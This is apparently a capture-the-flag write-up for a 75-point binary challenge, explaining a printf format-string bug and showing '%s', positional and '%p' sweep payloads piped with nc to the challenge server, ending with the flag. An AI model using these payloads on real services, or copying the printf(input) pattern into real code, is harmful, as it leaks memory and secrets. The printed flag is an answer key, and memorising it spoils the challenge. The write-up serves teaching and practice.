# Cyberphobia: Formatting Nightmare

 *Binrev — 75 points*

> I trusted the string, it revealed my secrets.

A binary (with source) and a service at `nc 18.226.103.146 9002`. The flag can only be fetched from the remote server, and I wrap whatever it leaks in `spooky{}`.

## The bug

The whole challenge is one line that hands my input straight to `printf` as the **format string**:

```c
printf(input, secret);   // input is attacker-controlled → it IS the format string
```

On x86-64 the System V calling convention puts `printf`'s format string in `rdi` and the **first variadic argument in `rsi`**. `main` calls `vuln(secret)` and `vuln` forwards `secret` into that slot, so `secret` is already sitting in `rsi` when `printf` runs. That means the very first `%s` conversion consumes `secret` and prints the string it points to.

## The exploit

The payload is literally just:

```
%s
```

```bash
echo '%s' | nc 18.226.103.146 9002
```

The server prints `Input:` followed by the leaked secret. Verified locally — `%s` dumps it straight out. Wrap the printed value in `spooky{}`, so if it prints `abc123` the flag is `spooky{abc123}`.

## If plain `%s` comes back empty

The pointer might sit at a slightly different argument slot on the remote. Positional / sweep payloads cover that:

```bash
printf '%%7$s\n' | nc 18.226.103.146 9002                           # positional: 7th arg
printf '%%p %%p %%p %%p %%p %%p %%p %%p\n' | nc 18.226.103.146 9002   # sweep
```

Given the source, plain `%s` is the intended one-shot leak.

🚩

```flag
spooky{f0rm4tStr1ngVulN3r4b1lityIsSc4rY}
```
